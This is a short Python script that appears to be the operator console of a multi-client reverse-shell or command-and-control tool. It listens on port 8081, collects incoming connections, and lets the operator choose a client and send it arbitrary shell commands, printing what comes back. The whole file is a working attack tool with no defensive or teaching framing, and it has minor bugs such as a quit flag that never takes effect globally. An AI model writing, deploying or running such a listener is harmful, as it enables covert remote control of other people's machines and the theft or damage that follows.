#coding:utf-8
import socket
import threading

clientList = []
curClient = None
quitThread = False
lock = threading.Lock()

def shell_ctrl(conn, addr):
    while True:
        com = input(str(addr[0]) + ' :~#')
        if com == '!ch':
            select_client()
            return
        if com == 'q':
            quitThread = True
            print("--"*10 + "Connection dieconnectd" + "--"*10)
            exit(0)
        conn.send(com.encode("utf-8"))
        data = conn.recv(1024)
        if data:
            conn.send("200 OK".encode("utf-8"))
        print(data.decode("utf-8"))

def select_client():
    global clientList
    global curClient
    print("--"*10 + "current connected " + "--"*10)
    for i in range(len(clientList)):
        print("[%d]->%s" % (i, str(clientList[i][0])))
    print("Please select a client:")

    while True:
        num = input("Client num:")
        if int(num) >= len(clientList):
            print("Please input a correct num! [ <%s ]" % len(clientList))
            continue
        else:
            break
    curClient = clientList[int(num)]
    print("=" * 80)
    print(" " * 20 + "Client Shell from addr:" + curClient[1][0])
    print("=" * 80)

def wait_connect(sk):
    global clientList
    while not quitThread:
        if len(clientList) == 0:
            print("Waiting for connetion....")
        sock, addr = sk.accept()
        print("New client %s is connection!" % addr[0])
        try:
            lock.acquire()
            clientList.append((sock, addr))
        finally:
            lock.release()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0",8081))
    s.listen(1024)
    t = threading.Thread(target=wait_connect, args=(s,))
    t.start()

    while True:
        if len(clientList) > 0:
            select_client()
            shell_ctrl(*curClient)


if __name__ == "__main__":
    main()
            

    
        
    
    
        
